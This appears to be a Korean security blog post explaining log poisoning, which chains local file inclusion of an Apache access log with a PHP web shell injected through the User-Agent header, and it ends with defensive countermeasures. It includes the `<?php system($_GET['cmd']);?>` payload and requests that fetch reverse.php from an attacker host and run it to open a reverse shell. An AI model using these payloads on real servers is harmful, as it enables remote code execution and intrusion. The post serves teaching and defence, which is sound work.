---
layout: single
title: (Web-Vuln) Log Poisoning
categories: Web-vuln
tag: [log injection, RCE, LFI, log poisoning]
toc: true
author_profile: false
sidebar:
    nav: "counts"
---
# 해당 취약점은 무엇인가?
>log Poisoning은 웹 어플리케이션에서 발생하는 취약점으로, LFI 취약점이 존재하며, Log 파일을 열람이 가능할 때 발생하며, log injection과 LFI 취약점이 선행되어야 한다. 이를 통해 RCE 까지로 이어질 수 있는 취약점이다.

***

# 공격 앤드포인트 탐색
해당 취약점은 서버에 존재하는 로그파일에 사용자의 정보 및 입력값이 쓰여질 때 발생할 수 있으므로, LFI 취약점이 존재해야한다.
```
http://victim.com/lifendpoint?view=
```
위와 같이 특정 파일을 Include하는 기능이 존재 한다고 가정해보자.
View 파라미터에 LFI 취약점이 존재하고, apache2 서비스가 동작중일 경우 일반적으로 /var/log/apache2/access.log 로그파일에 접근할 수 있다.
access.log 파일의 경우 웹 서버에서 접근 로그파일로, 사용자의 User-Agent 헤더 정보가 기록된다.
이 떄 User-Agent 값을 악의적인 사용자가 임의로 변경하게되면 그 정보 혹은 결과값이 access.log 파일에 기록된다(log injection).
## LFI 취약점을 통한 Log 파일 열람 
해당 시스템에 Apachee2 서비스가 동작 중이라면 access.log가 존재한다.
```
http://victim.com/lifendpoint?view=../../../../var/log/apache2/access.log
```
위와 같이 LFI 취약점이 존재할 경우 경로이동을 통해 access.log 파일에 접근할 수 있다.
![그림1-1](/assets/image/log_poisoning/image.png)
해당 access.log 파일에는 사용자의 User-Agent 값이 담기게 된다.
이 떄 악의 적인 사용자가 User-Agent 에 악성 코드를 삽입할 수 있다.

만약 해당 타겟시스템의 서버측 언어가 PHP 로 동작할 경우
```<?php system($_GET['cmd']);?> ```와 같이 php의 시스템 명령이 가능한 코드를 삽입하게 되면, 서버에서 User-Agent 헤더를 해석하는 과정에서 php 코드로 인식하여 이를 실행하게 된다.
즉 ***<span style="color:red"> RCE 취약점 까지 이어질 수 있는 치명적인 취약점이라고 볼 수 있다. </span>*** 

즉, 공격자 PC에서 리버스 커넥션 기능을 하는 악성 코드를 생서 후 웹서버를 구동시켜놓고, 해당 User-Agent 헤더에 공격자 PC에서 악성코드를 가져와 실행 시키는 명령어를 실행실 수 있게 된다.

```
GET /victim.com/lifendpoint?view=../../../../var/log/apache2/access.log&cmd=wget http://attacker/reverse.php

'''

User-Agent: <?php system($_GET['cmd']; ?)>
```

```
GET /victim.com/lifendpoint?view=../../../../var/log/apache2/access.log&cmd=php reverse.php

'''

User-Agent: <?php system($_GET['cmd']; ?)>
```
이를 통해 악성스크립트가 실행되며, 공격자 서버로의 Reverse Connection이 이루어지게된다.

# 대응방안
1. 로그 파일에 기록되는 이벤트 필터링을 통해, 정상적은 형식과 속성인지 검증 과정이 존재해야 한다.
2. 로그 파일을 암호화 하여, 외부에서의 데이터 변경 및 조작을 방지한다.
3. 로그 파일에 대한 접근 제어 및 권한부여를 통해 외부에서 데이터 변경 및 조작을 방지한다.
4. 실시간 모니터링을 통한 이상 징후를 탐지한다.
5. 정기적으로 로그파일에 대해 백업 및 무결성 검사를 실시한다.
6. 사용자 입력값에 대해 비정상적인 입력값이 들어오는지에 대한 입력값 검증이 필요하다.